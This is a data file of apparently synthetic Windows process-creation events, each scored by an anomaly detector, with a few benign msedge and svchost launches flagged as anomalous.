+1,2026-04-30T18:53:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.08939953401010681,False
+1,2026-04-30T18:55:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=8229,1,0.08484462110920266,False
+1,2026-04-30T18:56:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_kkWf.docx,1,0.08457636116347345,False
+1,2026-04-30T18:56:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_CXW5.xlsx,1,0.10627305351416283,False
+1,2026-04-30T18:58:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_x2Vg.txt,1,0.0852021844774572,False
+1,2026-04-30T19:15:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.10889308000606901,False
+1,2026-04-30T19:15:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=5100,1,0.053188047636918534,False
+1,2026-04-30T19:20:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.10889308000606901,False
+1,2026-04-30T19:22:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.12497353910364972,False
+1,2026-04-30T19:27:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=9258,1,0.053188047636918534,False
+1,2026-04-30T19:29:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.0836632657238604,False
+1,2026-04-30T19:34:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_QUwr.xlsx,1,0.10448306657450807,False
+1,2026-04-30T19:35:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_TIOq.xlsx,1,0.10448306657450807,False
+1,2026-04-30T19:36:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.12497353910364972,False
+1,2026-04-30T19:38:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.0836632657238604,False
+1,2026-04-30T19:39:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.10889308000606901,False
+1,2026-04-30T19:40:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_lhYw.xlsx,1,0.10448306657450807,False
+1,2026-04-30T19:45:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_FQvX.xlsx,1,0.10448306657450807,False
+1,2026-04-30T19:47:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.12497353910364972,False
+1,2026-04-30T19:53:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.0836632657238604,False
+1,2026-04-30T19:55:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.12497353910364972,False
+1,2026-04-30T19:58:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_MuGJ.docx,1,0.08611853169135508,False
+1,2026-04-30T19:58:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_J4ud.docx,1,0.08611853169135508,False
+1,2026-04-30T20:00:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=6328,1,0.05112198475640528,False
+1,2026-04-30T20:00:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.08171104758085534,False
+1,2026-04-30T20:03:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.08171104758085534,False
+1,2026-04-30T20:05:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_K5Wp.docx,1,0.0922530799286031,False
+1,2026-04-30T20:09:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_pHTa.xlsx,1,0.09264967961547677,False
+1,2026-04-30T20:10:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.11808568859866203,False
+1,2026-04-30T20:11:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_XACE.docx,1,0.0922530799286031,False
+1,2026-04-30T20:13:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.08171104758085534,False
+1,2026-04-30T20:17:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_LGMW.docx,1,0.0922530799286031,False
+1,2026-04-30T20:21:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=3227,1,0.05112198475640528,False
+1,2026-04-30T20:27:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=1932,1,0.060078998766452174,False
+1,2026-04-30T20:27:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.08171104758085534,False
+1,2026-04-30T20:28:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_kC4F.docx,1,0.0922530799286031,False
+1,2026-04-30T20:28:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.0988184440867701,False
+1,2026-04-30T20:28:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.08171104758085534,False
+1,2026-04-30T20:32:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.0988184440867701,False
+1,2026-04-30T20:32:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.0988184440867701,False
+1,2026-04-30T20:32:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_bV69.docx,1,0.0922530799286031,False
+1,2026-04-30T20:34:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.11808568859866203,False
+1,2026-04-30T20:37:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.06871167988120619,False
+1,2026-04-30T20:39:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_173S.xlsx,1,0.09264967961547677,False
+1,2026-04-30T20:43:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=9602,1,0.060078998766452174,False
+1,2026-04-30T20:49:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.11808568859866203,False
+1,2026-04-30T20:53:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_dwQ2.xlsx,1,0.09264967961547677,False
+1,2026-04-30T20:55:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.0988184440867701,False
+1,2026-04-30T20:59:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_GKOt.xlsx,1,0.09264967961547677,False
+1,2026-04-30T20:59:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.06871167988120619,False
+1,2026-04-30T21:00:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.05901696452909666,False
+1,2026-04-30T21:05:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.11113339150627982,False
+1,2026-04-30T21:07:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_A2JI.xlsx,1,0.06324375964720441,False
+1,2026-04-30T21:08:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.11113339150627982,False
+1,2026-04-30T21:13:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.05901696452909666,False
+1,2026-04-30T21:14:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_3E4T.txt,1,0.046535554313115735,False
+1,2026-04-30T21:17:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.05901696452909666,False
+1,2026-04-30T21:23:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_OalN.docx,1,0.07135990683882787,False
+1,2026-04-30T21:23:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.05901696452909666,False
+1,2026-04-30T21:27:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=6277,1,0.04409221143338171,False
+1,2026-04-30T21:28:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_m23i.docx,1,0.07135990683882787,False
+1,2026-04-30T21:29:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=3862,1,0.04409221143338171,False
+1,2026-04-30T21:33:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.0656207494615878,False
+1,2026-04-30T21:42:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=6191,1,0.04409221143338171,False
+1,2026-04-30T21:48:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_rtQR.txt,1,0.046535554313115735,False
+1,2026-04-30T21:49:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.11113339150627982,False
+1,2026-04-30T21:51:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.11113339150627982,False
+1,2026-04-30T21:51:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.0656207494615878,False
+1,2026-04-30T21:53:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.07398230385886007,False
+1,2026-04-30T22:09:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=3844,1,0.022848628246862845,False
+1,2026-04-30T22:13:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.061833814186439406,False
+1,2026-04-30T22:16:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=4518,1,0.05769876322085321,False
+1,2026-04-30T22:17:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=2813,1,0.05769876322085321,False
+1,2026-04-30T22:18:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=4886,1,0.05769876322085321,False
+1,2026-04-30T22:19:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.061833814186439406,False
+1,2026-04-30T22:24:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_HrF5.xlsx,1,0.0394359858688943,False
+1,2026-04-30T22:28:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_Cli5.txt,1,0.03312620041225778,False
+1,2026-04-30T22:29:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_UL6Y.docx,1,0.05958451363592887,False
+1,2026-04-30T22:30:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.09989515029893592,False
+1,2026-04-30T22:31:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.05706148070297512,False
+1,2026-04-30T22:32:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=5952,1,0.05769876322085321,False
+1,2026-04-30T22:35:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.024395586787168577,False
+1,2026-04-30T22:36:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=8141,1,0.05769876322085321,False
+1,2026-04-30T22:39:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_hRZM.docx,1,0.05958451363592887,False
+1,2026-04-30T22:40:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.09989515029893592,False
+1,2026-04-30T22:46:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.09989515029893592,False
+1,2026-04-30T22:47:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.05706148070297512,False
+1,2026-04-30T22:48:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.09989515029893592,False
+1,2026-04-30T22:50:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_O18X.txt,1,0.03312620041225778,False
+1,2026-04-30T22:55:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_h9wc.docx,1,0.05958451363592887,False
+1,2026-04-30T22:59:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.061833814186439406,False
+1,2026-04-30T23:02:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.06310830097321563,False
+1,2026-04-30T23:04:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=9450,-1,-0.0001306141934185323,True
+1,2026-04-30T23:08:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=1782,-1,-0.0001306141934185323,True
+1,2026-04-30T23:12:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,-1,-0.006426153412174673,True
+1,2026-04-30T23:12:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.03377014627389208,False
+1,2026-04-30T23:19:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.03377014627389208,False
+1,2026-04-30T23:22:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=6822,1,0.031496429519505154,False
+1,2026-04-30T23:26:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_AMu6.xlsx,1,0.018628979322730665,False
+1,2026-04-30T23:32:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=2941,1,0.031496429519505154,False
+1,2026-04-30T23:33:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.03377014627389208,False
+1,2026-04-30T23:36:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_N4TL.txt,1,0.015370761272127664,False
+1,2026-04-30T23:37:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_6OSB.docx,1,0.03139221154159699,False
+1,2026-04-30T23:44:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=6086,1,0.031496429519505154,False
+1,2026-04-30T23:45:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.06310830097321563,False
+1,2026-04-30T23:46:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=6986,-1,-0.0001306141934185323,True
+1,2026-04-30T23:52:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.06310830097321563,False
+1,2026-04-30T23:58:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_suOn.docx,1,0.03139221154159699,False
+1,2026-05-01T00:04:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_OYV0.docx,1,0.06040917379395849,False
+1,2026-05-01T00:05:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_jYfF.txt,1,0.02343701883814997,False
+1,2026-05-01T00:18:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.008254215752292127,False
+1,2026-05-01T00:19:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_cWjS.xlsx,1,0.04174366506594962,False
+1,2026-05-01T00:20:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_Sz6V.txt,1,0.02343701883814997,False
+1,2026-05-01T00:24:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_h7YM.docx,1,0.06040917379395849,False
+1,2026-05-01T00:25:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.04659061804073272,False
+1,2026-05-01T00:31:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_O4Nt.docx,1,0.06040917379395849,False
+1,2026-05-01T00:34:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_3Z6J.docx,1,0.06040917379395849,False
+1,2026-05-01T00:42:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.04659061804073272,False
+1,2026-05-01T00:44:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.04659061804073272,False
+1,2026-05-01T00:46:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_i5iI.docx,1,0.06040917379395849,False
+1,2026-05-01T00:46:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.022910127335939,False
+1,2026-05-01T00:47:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.04192568521287954,False
+1,2026-05-01T00:48:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=3610,1,0.006253588360942586,False
+1,2026-05-01T00:51:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_3a9W.xlsx,1,0.04174366506594962,False
+1,2026-05-01T00:56:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.04192568521287954,False
+1,2026-05-01T00:59:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.022910127335939,False
+1,2026-05-01T01:03:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.03231408296422367,False
+1,2026-05-01T01:04:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.07425368716323466,False
+1,2026-05-01T01:06:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_YNiL.docx,1,0.06992424193198721,False
+1,2026-05-01T01:08:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_Iq7V.xlsx,1,0.07286011482271737,False
+1,2026-05-01T01:09:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=7044,1,0.03313006664450269,False
+1,2026-05-01T01:15:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_uOIh.txt,1,0.05098871935425886,False
+1,2026-05-01T01:16:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.06780280394130767,False
+1,2026-05-01T01:17:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_wtAv.docx,1,0.06992424193198721,False
+1,2026-05-01T01:22:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=5044,-1,-0.015805681225017798,True
+1,2026-05-01T01:25:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_3PMJ.xlsx,1,0.07286011482271737,False
+1,2026-05-01T01:29:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.07425368716323466,False
+1,2026-05-01T01:31:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=6181,-1,-0.015805681225017798,True
+1,2026-05-01T01:37:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.06780280394130767,False
+1,2026-05-01T01:38:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_MKvI.xlsx,1,0.07286011482271737,False
+1,2026-05-01T01:39:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=4095,1,0.03313006664450269,False
+1,2026-05-01T01:54:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.03231408296422367,False
+1,2026-05-01T01:57:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.06780280394130767,False
+1,2026-05-01T01:58:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_19am.xlsx,1,0.07286011482271737,False
+1,2026-05-01T02:00:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.045051929497184506,False
+1,2026-05-01T02:00:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.045051929497184506,False
+1,2026-05-01T02:05:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=2074,1,0.0015020632243126775,False
+1,2026-05-01T02:08:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.07090723765770934,False
+1,2026-05-01T02:17:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.08858359581673814,False
+1,2026-05-01T02:17:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_bzEC.txt,1,0.06433135109155375,False
+1,2026-05-01T02:18:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_G68n.xlsx,1,0.0741103599478995,False
+1,2026-05-01T02:23:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_cbd5.xlsx,1,0.0741103599478995,False
+1,2026-05-01T02:25:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=3937,1,0.05181737355012195,False
+1,2026-05-01T02:26:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=7913,1,0.05181737355012195,False
+1,2026-05-01T02:30:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=2464,1,0.05181737355012195,False
+1,2026-05-01T02:32:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_5EYB.xlsx,1,0.0741103599478995,False
+1,2026-05-01T02:33:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.07090723765770934,False
+1,2026-05-01T02:34:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.08858359581673814,False
+1,2026-05-01T02:57:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.06663060844599822,False
+1,2026-05-01T03:00:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=9485,1,0.008451750779311484,False
+1,2026-05-01T03:02:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.07160384043686041,False
+1,2026-05-01T03:02:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.09106324871091387,False
+1,2026-05-01T03:06:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_OIWH.txt,1,0.08249547758456743,False
+1,2026-05-01T03:11:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.09106324871091387,False
+1,2026-05-01T03:15:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_KJLs.txt,1,0.08249547758456743,False
+1,2026-05-01T03:17:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_n3oU.docx,1,0.09267567455007475,False
+1,2026-05-01T03:22:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=8971,1,0.0522974050199404,False
+1,2026-05-01T03:24:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.06108984265301276,False
+1,2026-05-01T03:31:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_mnzG.docx,1,0.09267567455007475,False
+1,2026-05-01T03:31:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.09106324871091387,False
+1,2026-05-01T03:33:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_7KTU.txt,1,0.08249547758456743,False
+1,2026-05-01T03:34:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_TR5l.xlsx,1,0.07413078908368786,False
+1,2026-05-01T03:35:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.10152242165475339,False
+1,2026-05-01T03:38:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_bNqe.docx,1,0.09267567455007475,False
+1,2026-05-01T03:38:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.09106324871091387,False
+1,2026-05-01T03:43:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_e9V3.txt,1,0.08249547758456743,False
+1,2026-05-01T03:43:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_D3Ce.docx,1,0.09267567455007475,False
+1,2026-05-01T03:48:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.06108984265301276,False
+1,2026-05-01T03:50:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.06108984265301276,False
+1,2026-05-01T03:50:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=8120,1,0.008451750779311484,False
+1,2026-05-01T03:51:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.10152242165475339,False
+1,2026-05-01T03:55:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.10152242165475339,False
+1,2026-05-01T03:58:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.09106324871091387,False
+1,2026-05-01T04:00:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.10048231403580016,False
+1,2026-05-01T04:04:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.09355412674432295,False
+1,2026-05-01T04:06:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.10048231403580016,False
+1,2026-05-01T04:07:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_T9A5.docx,1,0.09806832749771482,False
+1,2026-05-01T04:08:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.09355412674432295,False
+1,2026-05-01T04:19:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.10048231403580016,False
+1,2026-05-01T04:20:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_cTHG.xlsx,1,0.07118015445342596,False
+1,2026-05-01T04:21:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.06640531394545612,False
+1,2026-05-01T04:24:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_oP3r.txt,1,0.08060431566896575,False
+1,2026-05-01T04:27:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.06640531394545612,False
+1,2026-05-01T04:30:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.06640531394545612,False
+1,2026-05-01T04:31:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=6982,1,0.05251151500268614,False
+1,2026-05-01T04:33:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.09355412674432295,False
+1,2026-05-01T04:38:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_5PNO.docx,1,0.09806832749771482,False
+1,2026-05-01T04:42:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_SjKd.txt,1,0.08060431566896575,False
+1,2026-05-01T04:43:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=8947,1,0.05251151500268614,False
+1,2026-05-01T04:54:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.09355412674432295,False
+1,2026-05-01T04:57:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_XewS.docx,1,0.09806832749771482,False
+1,2026-05-01T04:59:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_K7j0.docx,1,0.09806832749771482,False
+1,2026-05-01T05:00:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.0854820408255218,False
+1,2026-05-01T05:02:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.0854820408255218,False
+1,2026-05-01T05:03:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.09200124894591721,False
+1,2026-05-01T05:11:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.0854820408255218,False
+1,2026-05-01T05:12:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.06535221698964,False
+1,2026-05-01T05:18:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_874v.docx,1,0.10583171380541723,False
+1,2026-05-01T05:18:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=8762,1,0.05054601702953221,False
+1,2026-05-01T05:26:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=4329,1,0.01417499250107701,False
+1,2026-05-01T05:27:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=9643,1,0.05054601702953221,False
+1,2026-05-01T05:30:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_J1WJ.docx,1,0.10583171380541723,False
+1,2026-05-01T05:40:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_mQjG.txt,1,0.08341604055230356,False
+1,2026-05-01T05:42:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.09200124894591721,False
+1,2026-05-01T05:45:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_xHBd.xlsx,1,0.07518002266351786,False
+1,2026-05-01T05:47:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.06535221698964,False
+1,2026-05-01T05:54:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_5Atd.docx,1,0.10583171380541723,False
+1,2026-05-01T05:57:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_TJbu.docx,1,0.10583171380541723,False
+1,2026-05-01T06:04:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_R6gq.txt,1,0.09426502400498005,False
+1,2026-05-01T06:04:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_Anhy.txt,1,0.09426502400498005,False
+1,2026-05-01T06:06:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.06915121236748945,False
+1,2026-05-01T06:09:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=7747,1,0.0476738490546208,False
+1,2026-05-01T06:12:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.07813334776548453,False
+1,2026-05-01T06:13:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=5270,1,0.02567831268370424,False
+1,2026-05-01T06:16:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.06915121236748945,False
+1,2026-05-01T06:18:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=1232,1,0.02567831268370424,False
+1,2026-05-01T06:19:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_IUoK.xlsx,1,0.07575250281245649,False
+1,2026-05-01T06:21:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_00gq.txt,1,0.09426502400498005,False
